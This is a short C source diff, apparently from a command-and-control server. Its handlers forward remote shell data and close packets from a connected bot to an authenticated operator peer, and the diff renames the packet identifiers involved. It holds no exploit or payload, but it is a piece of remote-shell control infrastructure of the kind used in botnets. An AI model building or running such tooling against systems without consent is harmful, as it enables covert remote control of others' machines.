@@ -64,7 +64,7 @@ void laikaC_handleShellClose(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *u
         LAIKA_ERROR("LAIKAPKT_SHELL_CLOSE malformed packet!");
 
     /* forward to SHELL_CLOSE to auth */
-    laikaS_emptyOutPacket(bInfo->shellAuth, LAIKAPKT_AUTHENTICATED_SHELL_CLOSE);
+    laikaS_emptyOutPacket(bInfo->shellAuth, LAIKAPKT_SHELL_CLOSE);
 
     /* close shell */
     ((struct sLaika_authInfo*)(bInfo->shellAuth->uData))->shellBot = NULL;
@@ -82,7 +82,7 @@ void laikaC_handleShellData(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uD
     laikaS_read(&peer->sock, (void*)buf, sz);
 
     /* forward SHELL_DATA packet to auth */
-    laikaS_startVarPacket(bInfo->shellAuth, LAIKAPKT_AUTHENTICATED_SHELL_DATA);
+    laikaS_startVarPacket(bInfo->shellAuth, LAIKAPKT_SHELL_DATA);
     laikaS_write(&bInfo->shellAuth->sock, buf, sz);
     laikaS_endVarPacket(bInfo->shellAuth);
 }
@@ -164,11 +164,11 @@ struct sLaika_peerPacketInfo laikaC_authPktTbl[LAIKAPKT_MAXNONE] = {
         laikaC_handleAuthenticatedShellOpen,
         crypto_kx_PUBLICKEYBYTES + sizeof(uint16_t) + sizeof(uint16_t),
     false),
-    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_AUTHENTICATED_SHELL_CLOSE,
+    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_SHELL_CLOSE,
         laikaC_handleAuthenticatedShellClose,
         0,
     false),
-    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_AUTHENTICATED_SHELL_DATA,
+    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_SHELL_DATA,
         laikaC_handleAuthenticatedShellData,
         0,
     true),
